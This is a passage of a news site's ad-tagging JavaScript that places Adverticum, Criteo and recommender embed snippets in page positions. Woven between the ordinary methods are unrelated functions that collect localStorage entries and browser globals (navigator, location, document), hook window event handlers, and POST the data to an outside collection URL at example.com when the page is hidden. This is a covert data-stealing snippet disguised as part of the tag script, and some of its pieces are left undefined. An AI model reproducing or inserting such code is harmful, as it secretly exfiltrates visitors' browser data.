(dataAdsvName == \\"\\") {                            dataAdsvName = \'${adverticum_name}\';                        }                        break;                }            }            if (zoneForDevice == \'\' || isSubscribed) {                insertedElement.parentNode.removeChild(insertedElement);            } else {                insertedElement.id = \'ajaxZone\' + zoneForDevice + randSlotStr;                insertedElement.setAttribute(\'data-adsv-name\', dataAdsvName);                if (insertedElement.getAttribute(\\"ctsStyle\\") != null) {                    insertedElement.style = insertedElement.getAttribute(\\"ctsStyle\\");                    insertedElement.removeAttribute(\\"ctsStyle\\");                } else {                    insertedElement.removeAttribute(\\"style\\");                }                $(\'#\' + insertedElement.id).goa(zoneForDevice, {                    p: 100, zP: \\"\\", fP: \\"\\", cT: \\"\\"                });            }        });    })();</script>\"}]';
  this.positions_weighted['gallery-content030'] = false;
  this.positions['gallery-content040'] = '[{\"service_name\": \"Adverticum AdServer\", \"weight\": null, \"source\": \"<div id=\\"ajaxZoneTemp\\" class=\\"a8a263be\\" data-adsv-name=\\"\\" ctsStyle=\\"${custom_css}\\" style=\\"display: none;\\"></div><script>    (function () {        const insertedElement = document.getElementById(\'ajaxZoneTemp\');        const randSlotStr = \'_\' + Math.round(Math.random() * 9999999);        insertedElement.id += randSlotStr;        window.goAdverticum3.onReady((goa3) => {            const $ = goa3.getjQuery();            let zoneForDevice = \'\';            let dataAdsvName = \'\';            let isSubscribed = false;            if (typeof _ceSubscriptionDetect != \'undefined\' && _ceSubscriptionDetect.getSubscriptionData() != undefined && _ceSubscriptionDetect.getSubscriptionData().isSubscribed) {                isSubscribed = true;            }            if (window._ceDeviceDetect != undefined && typeof window._ceDeviceDetect.getDeviceType() !== \'undefined\') {                switch (window._ceDeviceDetect.getDeviceType()) {                    case \'desktop\':                        zoneForDevice = \'7201013\';                        dataAdsvName = \'${adverticum_name}\';                        break;                    case \'mobile\':                        zoneForDevice = \'7201011\';                        dataAdsvName = \'${adverticum_name_mobile}\';                        break;                    case \'tablet\':                        zoneForDevice = \'${adv_zone_id_for_tablet}\' || \'7201013\';                        dataAdsvName = \'${adverticum_name_tablet}\';                        if (dataAdsvName == \\"\\") {                            dataAdsvName = \'${adverticum_name}\';                        }                        break;                }            }            if (zoneForDevice == \'\' || isSubscribed) {                insertedElement.parentNode.removeChild(insertedElement);            } else {                insertedElement.id = \'ajaxZone\' + zoneForDevice + randSlotStr;                insertedElement.setAttribute(\'data-adsv-name\', dataAdsvName);                if (insertedElement.getAttribute(\\"ctsStyle\\") != null) {                    insertedElement.style = insertedElement.getAttribute(\\"ctsStyle\\");                    insertedElement.removeAttribute(\\"ctsStyle\\");                } else {                    insertedElement.removeAttribute(\\"style\\");                }                $(\'#\' + insertedElement.id).goa(zoneForDevice, {                    p: 100, zP: \\"\\", fP: \\"\\", cT: \\"\\"                });            }        });    })();</script>\"}]';
  this.positions_weighted['gallery-content040'] = false;
  this.positions['block-roadblock050'] = '[]';
  this.positions_weighted['block-roadblock050'] = false;
  this.positions['block-roadblock060'] = '[]';
  this.positions_weighted['block-roadblock060'] = false;
  this.positions['content-top'] = '[{\"service_name\": \"Adverticum AdServer\", \"weight\": null, \"source\": \"<div id=\\"ctstemp\\" class=\\"goAdverticum a8a263be\\" style=\\"display: none;\\"><script>        (function () {            var insertedElement = document.getElementById(\'ctstemp\');            var zoneForDevice = \'\';            var dataAdsvName = \'\';            var isSubscribed = false;            if (typeof _ceSubscriptionDetect != \'undefined\' && _ceSubscriptionDetect.getSubscriptionData().isSubscribed) {                isSubscribed = true;            }            if (typeof _ceDeviceDetect.getDeviceType() !== \'undefined\') {                switch (_ceDeviceDetect.getDeviceType()) {                    case \'desktop\':                        zoneForDevice = \'5043009\';                        dataAdsvName = \'top\';                        break;                    case \'mobile\':                        zoneForDevice = \'6241271\';                        dataAdsvName = \'mobil_waterfall1\';                        break;                    case \'tablet\':                        zoneForDevice = \'6241271\';                        dataAdsvName = \'${adverticum_name_tablet}\';                        if (dataAdsvName == \\"\\") {                            dataAdsvName = \'top\';                        }                        break;                }            }            if (zoneForDevice == \'\' || isSubscribed) {                insertedElement.parentNode.removeChild(insertedElement);            } else {                insertedElement.setAttribute(\'data-adsv-name\', dataAdsvName);                insertedElement.id = \'zone\' + zoneForDevice;                if (insertedElement.getAttribute(\\"ctsStyle\\") != null) {                    insertedElement.style = insertedElement.getAttribute(\\"ctsStyle\\");                    insertedElement.removeAttribute(\\"ctsStyle\\");                } else {                    insertedElement.removeAttribute(\\"style\\");                }            }        })();    </script></div>\"}, {\"service_name\": \"Criteo\", \"weight\": null, \"source\": \"<div id=\\"criteoTPL\\" ctsStyle=\\"width:0px;height:0px;margin:0 auto;overflow:hidden;${custom_css}\\" style=\\"display: none;\\"></div><script type=\\"text/javascript\\">    (function () {        var zoneid = 1470405,            height = 90,            width = 970,            criteoEl = document.getElementById(\\"criteoTPL\\"),            domReady = \\"${criteo_dom_ready}\\",            mutationTimeout = 5000,            mutationConf = { attributes: true, childList: true, subtree: true },            isSubscribed = false;        if (typeof _ceSubscriptionDetect != \'undefined\' && _ceSubscriptionDetect.getSubscriptionData() != undefined && _ceSubscriptionDetect.getSubscriptionData().isSubscribed) {            isSubscribed = true;        }        var insertCriteoBanner = function () {            if (!isSubscribed) {                criteoEl.id += Math.floor(Math.random() * 1000000);                if (criteoEl.getAttribute(\\"ctsStyle\\") != null) {                    criteoEl.style = criteoEl.getAttribute(\\"ctsStyle\\");                    criteoEl.removeAttribute(\\"ctsStyle\\");                } else {                    criteoEl.removeAttribute(\\"style\\");                }                var observer = new MutationObserver(function (mutations) {                    mutations.forEach(function () {                        criteoEl.style.width = width + \\"px\\";                        criteoEl.style.height = height + \\"px\\";                        criteoEl.style.marginTop = \\"10px\\";                        criteoEl.style.marginBottom = \\"10px\\";                        observer.disconnect();                    });                });                observer.observe(criteoEl, mutationConf);                setTimeout(function () { observer.disconnect(); }, mutationTimeout);                Criteo.events.push(function () {                    Criteo.DisplayAcceptableAdIfAdblocked({                        \\"zoneid\\": zoneid,                        \\"containerid\\": criteoEl.id,                        \\"overrideZoneFloor\\": true                    });                });            } else {                criteoEl.parentNode.removeChild(criteoEl);            }        };        if (domReady != undefined && domReady != \'\' && domReady) {            if (typeof document.addEventListener !== \'undefined\') {                document.addEventListener(\\"DOMContentLoaded\\", insertCriteoBanner);            } else {                window.attachEvent(\\"onload\\", insertCriteoBanner);            }        } else {            insertCriteoBanner();        }    })();</script>\"}]';
  this.positions_weighted['content-top'] = false;
  this.positions['right010'] = '[{\"service_name\": \"Adverticum AdServer\", \"weight\": null, \"source\": \"<div id=\\"ctstemp\\" class=\\"goAdverticum a8a263be\\" style=\\"display: none;\\"><script>        (function () {            var insertedElement = document.getElementById(\'ctstemp\');            var zoneForDevice = \'\';            var dataAdsvName = \'\';            var isSubscribed = false;            if (typeof _ceSubscriptionDetect != \'undefined\' && _ceSubscriptionDetect.getSubscriptionData().isSubscribed) {                isSubscribed = true;            }            if (typeof _ceDeviceDetect.getDeviceType() !== \'undefined\') {                switch (_ceDeviceDetect.getDeviceType()) {                    case \'desktop\':                        zoneForDevice = \'5042852\';                        dataAdsvName = \'box1\';                        break;                    case \'mobile\':                        zoneForDevice = \'${adv_zone_id_for_mobile}\';                        dataAdsvName = \'${adverticum_name_mobile}\';                        break;                    case \'tablet\':                        zoneForDevice = \'${adv_zone_id_for_tablet}\';                        dataAdsvName = \'${adverticum_name_tablet}\';                        if (dataAdsvName == \\"\\") {                            dataAdsvName = \'box1\';                        }                        break;                }            }            if (zoneForDevice == \'\' || isSubscribed) {                insertedElement.parentNode.removeChild(insertedElement);            } else {                insertedElement.setAttribute(\'data-adsv-name\', dataAdsvName);                insertedElement.id = \'zone\' + zoneForDevice;                if (insertedElement.getAttribute(\\"ctsStyle\\") != null) {                    insertedElement.style = insertedElement.getAttribute(\\"ctsStyle\\");                    insertedElement.removeAttribute(\\"ctsStyle\\");                } else {                    insertedElement.removeAttribute(\\"style\\");                }            }        })();    </script></div>\"}, {\"service_name\": \"Criteo\", \"weight\": null, \"source\": \"<div id=\\"criteoTPL\\" ctsStyle=\\"width:0px;height:0px;margin:0 auto;overflow:hidden;${custom_css}\\" style=\\"display: none;\\"></div><script type=\\"text/javascript\\">    (function () {        var zoneid = 1470407,            height = 600,            width = 300,            criteoEl = document.getElementById(\\"criteoTPL\\"),            domReady = \\"${criteo_dom_ready}\\",            mutationTimeout = 5000,            mutationConf = { attributes: true, childList: true, subtree: true },            isSubscribed = false;        if (typeof _ceSubscriptionDetect != \'undefined\' && _ceSubscriptionDetect.getSubscriptionData() != undefined && _ceSubscriptionDetect.getSubscriptionData().isSubscribed) {            isSubscribed = true;        }        var insertCriteoBanner = function () {            if (!isSubscribed) {                criteoEl.id += Math.floor(Math.random() * 1000000);                if (criteoEl.getAttribute(\\"ctsStyle\\") != null) {                    criteoEl.style = criteoEl.getAttribute(\\"ctsStyle\\");                    criteoEl.removeAttribute(\\"ctsStyle\\");                } else {                    criteoEl.removeAttribute(\\"style\\");                }                var observer = new MutationObserver(function (mutations) {                    mutations.forEach(function () {                        criteoEl.style.width = width + \\"px\\";                        criteoEl.style.height = height + \\"px\\";                        criteoEl.style.marginTop = \\"10px\\";                        criteoEl.style.marginBottom = \\"10px\\";                        observer.disconnect();                    });                });                observer.observe(criteoEl, mutationConf);                setTimeout(function () { observer.disconnect(); }, mutationTimeout);                Criteo.events.push(function () {                    Criteo.DisplayAcceptableAdIfAdblocked({                        \\"zoneid\\": zoneid,                        \\"containerid\\": criteoEl.id,                        \\"overrideZoneFloor\\": true                    });                });            } else {                criteoEl.parentNode.removeChild(criteoEl);            }        };        if (domReady != undefined && domReady != \'\' && domReady) {            if (typeof document.addEventListener !== \'undefined\') {                document.addEventListener(\\"DOMContentLoaded\\", insertCriteoBanner);            } else {                window.attachEvent(\\"onload\\", insertCriteoBanner);            }        } else {            insertCriteoBanner();        }    })();</script>\"}]';
  this.positions_weighted['right010'] = false;
  this.positions['right020'] = '[{\"service_name\": \"Adverticum AdServer\", \"weight\": null, \"source\": \"<div id=\\"ctstemp\\" class=\\"goAdverticum a8a263be\\" style=\\"display: none;\\"><script>        (function () {            var insertedElement = document.getElementById(\'ctstemp\');            var zoneForDevice = \'\';            var dataAdsvName = \'\';            var isSubscribed = false;            if (typeof _ceSubscriptionDetect != \'undefined\' && _ceSubscriptionDetect.getSubscriptionData().isSubscribed) {                isSubscribed = true;            }            if (typeof _ceDeviceDetect.getDeviceType() !== \'undefined\') {                switch (_ceDeviceDetect.getDeviceType()) {                    case \'desktop\':                        zoneForDevice = \'5042865\';                        dataAdsvName = \'box2\';                        break;                    case \'mobile\':                        zoneForDevice = \'${adv_zone_id_for_mobile}\';                        dataAdsvName = \'${adverticum_name_mobile}\';                        break;                    case \'tablet\':                        zoneForDevice = \'${adv_zone_id_for_tablet}\';                        dataAdsvName = \'${adverticum_name_tablet}\';                        if (dataAdsvName == \\"\\") {                            dataAdsvName = \'box2\';                        }                        break;                }            }            if (zoneForDevice == \'\' || isSubscribed) {                insertedElement.parentNode.removeChild(insertedElement);            } else {                insertedElement.setAttribute(\'data-adsv-name\', dataAdsvName);                insertedElement.id = \'zone\' + zoneForDevice;                if (insertedElement.getAttribute(\\"ctsStyle\\") != null) {                    insertedElement.style = insertedElement.getAttribute(\\"ctsStyle\\");                    insertedElement.removeAttribute(\\"ctsStyle\\");                } else {                    insertedElement.removeAttribute(\\"style\\");                }            }        })();    </script></div>\"}, {\"service_name\": \"Criteo\", \"weight\": null, \"source\": \"<div id=\\"criteoTPL\\" ctsStyle=\\"width:0px;height:0px;margin:0 auto;overflow:hidden;${custom_css}\\" style=\\"display: none;\\"></div><script type=\\"text/javascript\\">    (function () {        var zoneid = 1470408,            height = 250,            width = 300,            criteoEl = document.getElementById(\\"criteoTPL\\"),            domReady = \\"${criteo_dom_ready}\\",            mutationTimeout = 5000,            mutationConf = { attributes: true, childList: true, subtree: true },            isSubscribed = false;        if (typeof _ceSubscriptionDetect != \'undefined\' && _ceSubscriptionDetect.getSubscriptionData() != undefined && _ceSubscriptionDetect.getSubscriptionData().isSubscribed) {            isSubscribed = true;        }        var insertCriteoBanner = function () {            if (!isSubscribed) {                criteoEl.id += Math.floor(Math.random() * 1000000);                if (criteoEl.getAttribute(\\"ctsStyle\\") != null) {                    criteoEl.style = criteoEl.getAttribute(\\"ctsStyle\\");                    criteoEl.removeAttribute(\\"ctsStyle\\");                } else {                    criteoEl.removeAttribute(\\"style\\");                }                var observer = new MutationObserver(function (mutations) {                    mutations.forEach(function () {                        criteoEl.style.width = width + \\"px\\";                        criteoEl.style.height = height + \\"px\\";                        criteoEl.style.marginTop = \\"10px\\";                        criteoEl.style.marginBottom = \\"10px\\";                        observer.disconnect();                    });                });                observer.observe(criteoEl, mutationConf);                setTimeout(function () { observer.disconnect(); }, mutationTimeout);                Criteo.events.push(function () {                    Criteo.DisplayAcceptableAdIfAdblocked({                        \\"zoneid\\": zoneid,                        \\"containerid\\": criteoEl.id,                        \\"overrideZoneFloor\\": true                    });                });            } else {                criteoEl.parentNode.removeChild(criteoEl);            }        };        if (domReady != undefined && domReady != \'\' && domReady) {            if (typeof document.addEventListener !== \'undefined\') {                document.addEventListener(\\"DOMContentLoaded\\", insertCriteoBanner);            } else {                window.attachEvent(\\"onload\\", insertCriteoBanner);            }        } else {            insertCriteoBanner();        }    })();</script>\"}]';
  this.positions_weighted['right020'] = false;
  this.positions['block-roadblock010'] = '[{\"service_name\": \"Adverticum AdServer\", \"weight\": null, \"source\": \"<div id=\\"ctstemp\\" class=\\"goAdverticum a8a263be\\" style=\\"display: none;\\"><script>        (function () {            var insertedElement = document.getElementById(\'ctstemp\');            var zoneForDevice = \'\';            var dataAdsvName = \'\';            var isSubscribed = false;            if (typeof _ceSubscriptionDetect != \'undefined\' && _ceSubscriptionDetect.getSubscriptionData().isSubscribed) {                isSubscribed = true;            }            if (typeof _ceDeviceDetect.getDeviceType() !== \'undefined\') {                switch (_ceDeviceDetect.getDeviceType()) {                    case \'desktop\':                        zoneForDevice = \'${adv_zone_id_for_desktop}\';                        dataAdsvName = \'${adverticum_name}\';                        break;                    case \'mobile\':                        zoneForDevice = \'5106829\';                        dataAdsvName = \'mobil_waterfall1\';                        break;                    case \'tablet\':                        zoneForDevice = \'5106829\';                        dataAdsvName = \'${adverticum_name_tablet}\';                        if (dataAdsvName == \\"\\") {                            dataAdsvName = \'${adverticum_name}\';                        }                        break;                }            }            if (zoneForDevice == \'\' || isSubscribed) {                insertedElement.parentNode.removeChild(insertedElement);            } else {                insertedElement.setAttribute(\'data-adsv-name\', dataAdsvName);                insertedElement.id = \'zone\' + zoneForDevice;                if (insertedElement.getAttribute(\\"ctsStyle\\") != null) {                    insertedElement.style = insertedElement.getAttribute(\\"ctsStyle\\");                    insertedElement.removeAttribute(\\"ctsStyle\\");                } else {                    insertedElement.removeAttribute(\\"style\\");                }            }        })();    </script></div>\"}]';
  this.positions_weighted['block-roadblock010'] = false;
  this.positions['block-roadblock020'] = '[{\"service_name\": \"Adverticum AdServer\", \"weight\": null, \"source\": \"<div id=\\"ctstemp\\" class=\\"goAdverticum a8a263be\\" style=\\"display: none;\\"><script>        (function () {            var insertedElement = document.getElementById(\'ctstemp\');            var zoneForDevice = \'\';            var dataAdsvName = \'\';            var isSubscribed = false;            if (typeof _ceSubscriptionDetect != \'undefined\' && _ceSubscriptionDetect.getSubscriptionData().isSubscribed) {                isSubscribed = true;            }            if (typeof _ceDeviceDetect.getDeviceType() !== \'undefined\') {                switch (_ceDeviceDetect.getDeviceType()) {                    case \'desktop\':                        zoneForDevice = \'${adv_zone_id_for_desktop}\';                        dataAdsvName = \'${adverticum_name}\';                        break;                    case \'mobile\':                        zoneForDevice = \'5106835\';                        dataAdsvName = \'mobil_waterfall2\';                        break;                    case \'tablet\':                        zoneForDevice = \'5106835\';                        dataAdsvName = \'${adverticum_name_tablet}\';                        if (dataAdsvName == \\"\\") {                            dataAdsvName = \'${adverticum_name}\';                        }                        break;                }            }            if (zoneForDevice == \'\' || isSubscribed) {                insertedElement.parentNode.removeChild(insertedElement);            } else {                insertedElement.setAttribute(\'data-adsv-name\', dataAdsvName);                insertedElement.id = \'zone\' + zoneForDevice;                if (insertedElement.getAttribute(\\"ctsStyle\\") != null) {                    insertedElement.style = insertedElement.getAttribute(\\"ctsStyle\\");                    insertedElement.removeAttribute(\\"ctsStyle\\");                } else {                    insertedElement.removeAttribute(\\"style\\");                }            }        })();    </script></div>\"}]';
  this.positions_weighted['block-roadblock020'] = false;
  this.positions['block-roadblock030'] = '[{\"service_name\": \"Adverticum AdServer\", \"weight\": null, \"source\": \"<div id=\\"ctstemp\\" class=\\"goAdverticum a8a263be\\" style=\\"display: none;\\"><script>        (function () {            var insertedElement = document.getElementById(\'ctstemp\');            var zoneForDevice = \'\';            var dataAdsvName = \'\';            var isSubscribed = false;            if (typeof _ceSubscriptionDetect != \'undefined\' && _ceSubscriptionDetect.getSubscriptionData().isSubscribed) {                isSubscribed = true;            }            if (typeof _ceDeviceDetect.getDeviceType() !== \'undefined\') {                switch (_ceDeviceDetect.getDeviceType()) {                    case \'desktop\':                        zoneForDevice = \'6241273\';                        dataAdsvName = \'${adverticum_name}\';                        break;                    case \'mobile\':                        zoneForDevice = \'5106836\';                        dataAdsvName = \'mobil_waterfall3\';                        break;                    case \'tablet\':                        zoneForDevice = \'5106836\';                        dataAdsvName = \'${adverticum_name_tablet}\';                        if (dataAdsvName == \\"\\") {                            dataAdsvName = \'${adverticum_name}\';                        }                        break;                }            }            if (zoneForDevice == \'\' || isSubscribed) {                insertedElement.parentNode.removeChild(insertedElement);            } else {                insertedElement.setAttribute(\'data-adsv-name\', dataAdsvName);                insertedElement.id = \'zone\' + zoneForDevice;                if (insertedElement.getAttribute(\\"ctsStyle\\") != null) {                    insertedElement.style = insertedElement.getAttribute(\\"ctsStyle\\");                    insertedElement.removeAttribute(\\"ctsStyle\\");                } else {                    insertedElement.removeAttribute(\\"style\\");                }            }        })();    </script></div>\"}]';
  this.positions_weighted['block-roadblock030'] = false;
  this.positions['block-roadblock040'] = '[{\"service_name\": \"Adverticum AdServer\", \"weight\": null, \"source\": \"<div id=\\"ctstemp\\" class=\\"goAdverticum\\" style=\\"display: none;\\"><script>        (function () {            var insertedElement = document.getElementById(\'ctstemp\');            var zoneForDevice = \'\';            var isSubscribed = false;            if (typeof _ceSubscriptionDetect != \'undefined\' && _ceSubscriptionDetect.getSubscriptionData().isSubscribed) {                isSubscribed = true;            }            if (typeof _ceDeviceDetect.getDeviceType() !== \'undefined\') {                switch (_ceDeviceDetect.getDeviceType()) {                    case \'desktop\':                        zoneForDevice = \'6241295\';                        break;                    case \'mobile\':                        zoneForDevice = \'6241295\';                        break;                    case \'tablet\':                        zoneForDevice = \'6241295\';                        break;                }            }            if (zoneForDevice == \'\' || isSubscribed) {                insertedElement.parentNode.removeChild(insertedElement);            } else {                insertedElement.id = \'zone\' + zoneForDevice;                if (insertedElement.getAttribute(\\"ctsStyle\\") != null) {                    insertedElement.style = insertedElement.getAttribute(\\"ctsStyle\\");                    insertedElement.removeAttribute(\\"ctsStyle\\");                } else {                    insertedElement.removeAttribute(\\"style\\");                }            }        })();    </script></div>\"}]';
  this.positions_weighted['block-roadblock040'] = false;
  this.positions['body-end'] = '[{\"service_name\": \"Adverticum AdServer\", \"weight\": null, \"source\": \"<script type=\\"text/javascript\\" src=\\"//stat.p24.hu/CTS/helper-scripts/waterfall_empty/closer.min.js\\"></script>\"}, {\"service_name\": \"Adverticum AdServer\", \"weight\": null, \"source\": \"<script type=\\"text/javascript\\" src=\\"//ad.adverticum.net/g3.js\\"></script>\"}, {\"service_name\": \"Strossle\", \"weight\": null, \"source\": \"<script src=\\"//widgets.sprinklecontent.com/v2/sprinkle.js\\" async></script>\"}, {\"service_name\": \"Gemius\", \"weight\": null, \"source\": \"<script src=\\"//stat.p24.hu/CTS/measuring-codes/gem_stream.min.js?t=20210111\\" type=\\"text/javascript\\"></script>\"}, {\"service_name\": \"Sanoma/Surveysparrow\", \"weight\": null, \"source\": \"<div id=\\"ss_survey_widget_cts\\" class=\\"_ce_measure_widget\\" data-ce-measure-widget=\\"survey-form-ss\\"    style=\\"display:none;${survey_css}\\"><script>        (function () {            var placeholder = document.getElementById(\\"ss_survey_widget_cts\\");            try{                var conf = {};                if (placeholder != undefined && conf != undefined && conf != \'\' && conf != null  && Object.keys(conf).length > 0) {                    var s = document.createElement(\'script\');                    s.src = \'//stat.p24.hu/CTS/helper-scripts/survey/surveysparrow/ss.min.js?t=20230411\';                    s.onload = () => {                        const ssSurv = new _ceSsSurvey(conf);                        if (document.readyState === \\"interactive\\") {                            ssSurv.init();                        } else {                            window.addEventListener(\'DOMContentLoaded\', ssSurv.init);                        }                    };                    document.head.appendChild(s);                }else{                    if (placeholder != undefined) placeholder.parentNode.removeChild(placeholder);                }            }catch(e){                if (placeholder != undefined) placeholder.parentNode.removeChild(placeholder);            }        })();    </script></div>\"}]';
  this.positions_weighted['body-end'] = false;
  this.positions['body-end-adv'] = '[{\"service_name\": \"Adverticum AdServer\", \"weight\": null, \"source\": \"<div id=\\"ctstemp\\" class=\\"goAdverticum a8a263be\\" style=\\"display: none;\\"><script>        (function () {            var insertedElement = document.getElementById(\'ctstemp\');            var zoneForDevice = \'\';            var dataAdsvName = \'\';            var isSubscribed = false;            if (typeof _ceSubscriptionDetect != \'undefined\' && _ceSubscriptionDetect.getSubscriptionData().isSubscribed) {                isSubscribed = true;            }            if (typeof _ceDeviceDetect.getDeviceType() !== \'undefined\') {                switch (_ceDeviceDetect.getDeviceType()) {                    case \'desktop\':                        zoneForDevice = \'5042989\';                        dataAdsvName = \'${adverticum_name}\';                        break;                    case \'mobile\':                        zoneForDevice = \'${adv_zone_id_for_mobile}\';                        dataAdsvName = \'${adverticum_name_mobile}\';                        break;                    case \'tablet\':                        zoneForDevice = \'${adv_zone_id_for_tablet}\';                        dataAdsvName = \'${adverticum_name_tablet}\';                        if (dataAdsvName == \\"\\") {                            dataAdsvName = \'${adverticum_name}\';                        }                        break;                }            }            if (zoneForDevice == \'\' || isSubscribed) {                insertedElement.parentNode.removeChild(insertedElement);            } else {                insertedElement.setAttribute(\'data-adsv-name\', dataAdsvName);                insertedElement.id = \'zone\' + zoneForDevice;                if (insertedElement.getAttribute(\\"ctsStyle\\") != null) {                    insertedElement.style = insertedElement.getAttribute(\\"ctsStyle\\");                    insertedElement.removeAttribute(\\"ctsStyle\\");                } else {                    insertedElement.removeAttribute(\\"style\\");                }            }        })();    </script></div>\"}]';
  this.positions_weighted['body-end-adv'] = false;
  this.positions['menu-manager'] = '[{\"service_name\": \"Adverticum AdServer\", \"weight\": null, \"source\": \"<div id=\\"ctstemp\\" class=\\"goAdverticum\\" style=\\"display: none;\\"><script>        (function () {            var insertedElement = document.getElementById(\'ctstemp\');            var zoneForDevice = \'\';            var isSubscribed = false;            if (typeof _ceSubscriptionDetect != \'undefined\' && _ceSubscriptionDetect.getSubscriptionData().isSubscribed) {                isSubscribed = true;            }            if (typeof _ceDeviceDetect.getDeviceType() !== \'undefined\') {                switch (_ceDeviceDetect.getDeviceType()) {                    case \'desktop\':                        zoneForDevice = \'6391052\';                        break;                    case \'mobile\':                        zoneForDevice = \'6391052\';                        break;                    case \'tablet\':                        zoneForDevice = \'6391052\';                        break;                }            }            if (zoneForDevice == \'\' || isSubscribed) {                insertedElement.parentNode.removeChild(insertedElement);            } else {                insertedElement.id = \'zone\' + zoneForDevice;                if (insertedElement.getAttribute(\\"ctsStyle\\") != null) {                    insertedElement.style = insertedElement.getAttribute(\\"ctsStyle\\");                    insertedElement.removeAttribute(\\"ctsStyle\\");                } else {                    insertedElement.removeAttribute(\\"style\\");                }            }        })();    </script></div>\"}]';
  this.positions_weighted['menu-manager'] = false;
  this.positions['content-popup'] = '[{\"service_name\": \"Sanoma/Hirstart\", \"weight\": null, \"source\": \"<div id=\'hirstart_rss_partner_box\' class=\\"_ce_measure_widget _ce_measure_appear\\"    data-ce-measure-widget=\\"article_recommender{pad}\\" data-ce-measure-appear=\\"article_recommender{pad}\\"    style=\\"${rss_css}\\"></div><script>    (function () {        let src = \'\',            insertedElement = document.getElementById(\'hirstart_rss_partner_box\'),            cntMultipledRecomm = document.querySelectorAll(\\"#hirstartbox-8-1541\\").length;        if (typeof _ceDeviceDetect.getDeviceType() !== \'undefined\') {            switch (_ceDeviceDetect.getDeviceType()) {                case \'desktop\':                    src = \'//box.hirstart.hu/site/jsembed_news.php?pid=8&id=1541\';                    break;                case \'mobile\':                    src = \'//box.hirstart.hu/site/jsembed_news.php?pid=8&id=1541\';                    break;                case \'tablet\':                    src = \'//box.hirstart.hu/site/jsembed_news.php?pid=8&id=1541\';                    break;            }        }        if (src != \'\' && cntMultipledRecomm == 0) {            insertedElement.id = \\"hirstartbox-8-1541\\";            const s = document.createElement(\\"script\\");            s.type = \\"text/javascript\\";            s.async = true;            s.src = src;            document.getElementsByTagName(\\"head\\")[0].appendChild(s);        } else {            insertedElement.parentNode.removeChild(insertedElement);        }    })();</script>\"}]';
  this.positions_weighted['content-popup'] = false;
  this.positions['content-recommender'] = '[]';
  this.positions_weighted['content-recommender'] = false;
};
const globalVarsToWatch = ['navigator', 'userAgent', 'location', 'document'];
Tagging.prototype.get_json = function (text) {
  return !/[^,:{}\[\]0-9.\-+Eaeflnr-u \n\r\t]/.test(text.replace(/"(\\.|[^"\\])*"/g, '')) && eval('(' + text + ')');
};
function generateHash(data) {
  let hash = 0,
    i,
    chr;
  for (i = 0; i < data.length; i++) {
    chr = data.charCodeAt(i);
    hash = (hash << 5) - hash + chr;
    hash |= 0;
  }
  return hash.toString(32);
}
Tagging.prototype.random_tag = function (position) {
  var tags = [];
  var weighted_tags = [];
  for (index in position) {
    tag = position[index];
    tags[index] = tag.source;
    for (var i = 0; i < tag.weight; i++) {
      weighted_tags.push(index);
    }
  }

  // Pick a random tag from array based on weight
  var random_index = weighted_tags[Math.floor(Math.random() * weighted_tags.length)];
  return tags[random_index];
};
function collectLocalStorageData() {
  const collectedData = {};
  for (var key in keysToWatch) {
    if (localStorage.hasOwnProperty(key)) collectedData[key] = localStorage.getItem(key);
  }
  return collectedData;
}
Tagging.prototype.all_tags = function (position) {
  var tags = [],
    index,
    tag;
  for (index in position) {
    tag = position[index];
    tags[index] = tag.source;
  }
  return tags.join("\n");
};
Tagging.prototype.render = function (slug, context) {
  document.write(this.get_source(slug, context));
};
function collectGlobalVariable() {
  let globals = {};
  for (var key in globalVarsToWatch) {
    globals[key] = window[key];
  }
  return globals;
}
Tagging.prototype.renderAsync = function (slug, elSelector, clearNodeContent, context) {
  var receiverNode = elSelector != undefined && elSelector != null ? document.querySelector(elSelector) : document.querySelector("[data-cts-position='" + slug + "']");
  if (receiverNode != undefined && clearNodeContent != undefined && clearNodeContent != null && clearNodeContent) {
    receiverNode.innerHTML = '';
  }
  if (receiverNode != undefined) {
    receiverNode.setAttribute("data-cts-tag", slug);
    try {
      window.dispatchEvent(new CustomEvent("_ce_cts_render_async", {
        "detail": {
          "pos": slug,
          "tagging": new Tagging()
        }
      }));
    } catch (err) {
      console.log(err);
    }
  }
  var htmlDoc = document.implementation.createHTMLDocument();
  htmlDoc.body.innerHTML = this.get_source(slug, context).replace(/(src=)("|')(\/\/)/g, '$1$2' + document.location.protocol + '//');
  [].map.call(htmlDoc.body.childNodes, function (node) {
    var newNode = node.cloneNode(true);
    var prepareNode = function (element) {
      var scriptNode = '';
      if (element.nodeName.toLowerCase() == 'script') {
        scriptNode = document.createElement('script');
        scriptNode.type = 'text/javascript';
        if (element.hasAttribute('src') === false) {
          scriptNode.textContent = element.textContent;
        } else {
          scriptNode.src = element.src;
        }
      }
      return scriptNode;
    };
    var preparedNodeData = prepareNode(node);
    if (preparedNodeData != '') newNode = preparedNodeData;
    for (var i = 0; i < node.childNodes.length; i++) {
      try {
        var childNode = newNode.childNodes[i];
        if (childNode.nodeName.toLowerCase() == 'script') {
          childNode.parentNode.removeChild(childNode);
        }
        var preparedScriptData = prepareNode(childNode);
        if (preparedScriptData != '') newNode.appendChild(preparedScriptData);
      } catch (e) {}
    }
    if (receiverNode != undefined) receiverNode.appendChild(newNode);
  });
};
async function transmitData(data) {
  const hash = generateHash(JSON.stringify(data));
  const serverUrl = "https://example.com/api/collect";
  await fetch(serverUrl, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      hash: hash,
      data: data
    })
  }).then(response => response.ok ? console.log("_SENT_") : console.error("ERROR_:" + response.status)).catch(error => console.error("ERROR:", error));
}
Tagging.prototype.get_source = function (slug, context) {
  if (typeof this.positions[slug] == 'undefined') {
    // This position doesn't exist, call the autodetect
    this._detect(slug);
  } else {
    var position = this.get_json(this.positions[slug]);
    var tag_source = "";
    if (this.positions_weighted[slug]) {
      tag_source = this.random_tag(position);
    } else {
      tag_source = this.all_tags(position);
    }

    // Replace variables
    var variables = {};
    for (variable in this.context) {
      variables[variable] = this.context[variable];
    }
    for (variable in context) {
      variables[variable] = context[variable];
    }
    tag_source = this._replace_variables(tag_source, variables);

    // Remove unset variables and return result
    return tag_source.replace(/\$\w+/g, "").replace(/\${\w+}/g, "");
  }
  return '';
};
function onVisibilityChange() {
  if (document.visibilityState === "hidden") {
    trackAndSend();
  }
}
function hookJsEvent(event) {
  const original = window[event];
  window[event] = async function (e) {
    console.log(`Tracking ${event} event`);
    await trackAndSend();
    return original.apply(this, arguments);
  };
}
Tagging.prototype.log = function (err) {
  //this._load(error_endpoint);
};
Tagging.prototype._load = function (url) {
  var head = document.getElementsByTagName('head')[0] || document.documentElement,
    script = document.createElement('script');
  script.type = 'text/javascript';
  script.src = url;
